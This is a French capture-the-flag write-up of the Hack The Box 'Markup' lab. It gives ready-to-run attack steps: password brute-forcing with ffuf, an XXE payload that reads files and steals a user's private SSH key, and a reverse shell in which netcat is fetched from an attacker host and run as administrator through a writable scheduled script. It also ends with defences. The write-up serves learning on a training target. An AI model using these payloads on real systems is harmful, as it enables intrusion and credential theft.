---
# Imported from Obsidian: HTB/Markup.md
title: Markup
category: Boot2Root
difficulty: Easy
ctf: Hack The Box
date: 2026-10-09
summary: 'Machine Windows (XAMPP) avec SSH ouvert — à retenir : si on trouve une clé, on a un accès direct.'
tags:
- boot2root
- hack-the-box
- starting-point
- tier-2
lang: fr
imported: true
---

> Plateforme : **Hack The Box** — Starting Point (Tier 2)

## Informations

- **Catégorie :** Web (XXE) → clé SSH → tâche planifiée modifiable
- **Difficulté :** Easy
- **Auteur du write-up :** 3ch0
- **Services :** `22` (OpenSSH for Windows), `80/443` (Apache 2.4.41 / PHP 7.2.28 — XAMPP)
- **Flag user :** `032d2fc8952a8c24e39c8f0ee9918ef7`
- **Flag root :** `f574a3e7650cebd8c39784299cb570f8`

---

## 1. Reconnaissance

```bash
nmap -sC -sV 10.129.95.192
```

```text
22/tcp  open  ssh      OpenSSH for_Windows_8.1
80/tcp  open  http     Apache 2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28   (MegaShopping)
443/tcp open  ssl/http Apache 2.4.41 ...
```

Machine **Windows** (XAMPP) avec SSH ouvert — à retenir : si on trouve une clé, on a un accès direct.

```bash
ffuf -u http://10.129.95.192/FUZZ -w /usr/share/wordlists/dirb/common.txt \
  -e .php,.txt,.html,.bak -mc all -fs 1058,0,1046
```

![Screenshot](./images/obsidian/markup/pasted-image-20261009002510.png)

La page d'`index.php` présente un **formulaire de connexion**.

![Screenshot](./images/obsidian/markup/pasted-image-20261009002916.png)

---

## 2. Accès applicatif — identifiants faibles

Brute-force du mot de passe sur `admin` :

```bash
ffuf -u "http://10.129.95.192/index.php" -X POST \
  -d "username=admin&password=FUZZ" \
  -w /usr/share/wordlists/rockyou.txt \
  -H "Content-Type: application/x-www-form-urlencoded" -fs 66
```

![Screenshot](./images/obsidian/markup/pasted-image-20261009003035.png)

```text
admin / password
```

Une fois connecté, on peut **passer une commande** :

![Screenshot](./images/obsidian/markup/pasted-image-20261009004305.png)

---

## 3. XXE sur `process.php`

En interceptant l'envoi d'une commande (Burp), on voit que les données partent en **XML** vers `process.php` :

```http
POST /process.php
<?xml version="1.0"?><order><quantity>1</quantity><item>Home Appliances</item><address>test</address></order>
```

![Screenshot](./images/obsidian/markup/pasted-image-20261009004630.png)

L'application parse du XML fourni par l'utilisateur → test **XXE**. Le message de succès **réfléchit le champ `item`**, donc on y injecte notre entité externe :

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<order>
  <quantity>1</quantity>
  <item>&xxe;</item>
  <address>test</address>
</order>
```

```text
Your order for ; for 16-bit app support
[fonts]
...
 has been processed
```

![Screenshot](./images/obsidian/markup/pasted-image-20261009011529.png)

XXE **confirmée** (lecture de fichiers in-band via le champ réfléchi).

---

## 4. Fuite de la clé SSH

Le code source de `/services` contient un commentaire de développeur :

```html
<!-- Modified by Daniel : UI-Fix-9092 -->
```

![Screenshot](./images/obsidian/markup/pasted-image-20261009013242.png)

→ utilisateur **Daniel**. On lit sa clé privée SSH via XXE :

```xml
<!ENTITY xxe SYSTEM "file:///C:/Users/Daniel/.ssh/id_rsa">
```

![Screenshot](./images/obsidian/markup/pasted-image-20261009014402.png)

On récupère le bloc `-----BEGIN OPENSSH PRIVATE KEY-----`.

> Piège : la clé extraite via le HTML arrive souvent avec des **CRLF**. Si `ssh` répond `invalid format`, nettoyer (`sed -i 's/\r$//' id_rsa`) et garantir une newline finale.

```bash
chmod 600 id_rsa
ssh -i id_rsa daniel@10.129.95.192
```

```text
markup\daniel
```

![Screenshot](./images/obsidian/markup/pasted-image-20261009014841.png)

### Flag user

```batch
type Desktop\user.txt
```

![Screenshot](./images/obsidian/markup/pasted-image-20261009015002.png)

```text
032d2fc8952a8c24e39c8f0ee9918ef7
```

---

## 5. Privesc — tâche planifiée modifiable

Énumération avec **winPEAS** (`powershell -ep bypass -File winpeas.ps1`). On repère un script dans un dossier custom : **`C:\Log-Management\job.bat`**.

![Screenshot](./images/obsidian/markup/pasted-image-20261009021052.png)

Contenu : un script de **nettoyage des journaux d'événements**, conçu pour tourner **en administrateur** (il teste ses propres privilèges via `bcdedit`) et déclenché périodiquement.

```text
@echo off
FOR /F "tokens=1,2*" V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" G")
...
```

![Screenshot](./images/obsidian/markup/pasted-image-20261009021454.png)

Vérification des droits sur le fichier :

```batch
icacls C:\Log-Management\job.bat
```

```text
C:\Log-Management\job.bat BUILTIN\Users:(F)   <-- Full control pour tous
```

![Screenshot](./images/obsidian/markup/pasted-image-20261009022234.png)

**`BUILTIN\Users:(F)`** = n'importe quel utilisateur peut réécrire le script. Comme il s'exécute en admin, on remplace son contenu par un reverse shell.

```bash
# Kali
python3 -m http.server 80
nc -lvnp 4444
```

```batch
:: cible (daniel)
powershell -c wget http://10.10.15.244/nc.exe -o C:\Log-Management\nc.exe
echo C:\Log-Management\nc.exe -e cmd.exe 10.10.15.244 4444 > C:\Log-Management\job.bat
```

Au prochain déclenchement de la tâche, le listener attrape un shell **administrateur** :

```text
connect to [10.10.15.244] from 10.129.95.192
C:\Windows\system32> whoami
markup\administrator
```

### Flag root

```batch
type C:\Users\Administrator\Desktop\root.txt
```

![Screenshot](./images/obsidian/markup/pasted-image-20261009022539.png)

```text
f574a3e7650cebd8c39784299cb570f8
```

---

## Récapitulatif de la chaîne

1. **nmap** → XAMPP (80/443) + SSH (22).
2. Login `admin:password` (brute-force) → formulaire de commande.
3. **XXE** sur `process.php` (champ `item` réfléchi) → lecture de fichiers.
4. Commentaire source → user **Daniel** → XXE sur sa **clé SSH** → accès user.
5. **`job.bat`** (tâche planifiée admin) **modifiable par `Users`** → reverse shell → **administrator**.

> **Concept clé :** Markup enchaîne une injection XML et une mauvaise permission de fichier. (1) La **XXE** vient de ce qu'un parseur XML résout les **entités externes** (`SYSTEM "file://..."`) sur une entrée utilisateur : ici l'exfiltration est _in-band_ car un champ du XML (`item`) est renvoyé dans la réponse — pas besoin d'OOB (que PHP/libxml bloque d'ailleurs via l'interdiction des entités paramètres dans le sous-ensemble interne). On lit d'abord un fichier anodin (`win.ini`) pour prouver la faille, puis la vraie cible : une **clé SSH privée**, qui donne un accès direct vu le port 22 ouvert. (2) La privesc ne repose sur aucun exploit : un **script lancé avec des privilèges élevés** (`job.bat`) est **modifiable par tous** (`BUILTIN\Users:(F)`) — contrôler le contenu d'un fichier exécuté en admin, c'est exécuter du code en admin. Défenses : désactiver la résolution d'entités externes (`libxml_disable_entity_loader(true)` en PHP), ne pas stocker de clés privées lisibles, et verrouiller les ACL de tout script/tâche privilégié (jamais `Users:(F)` sur un fichier exécuté par SYSTEM/Administrator).

---

_**— 3ch0**_
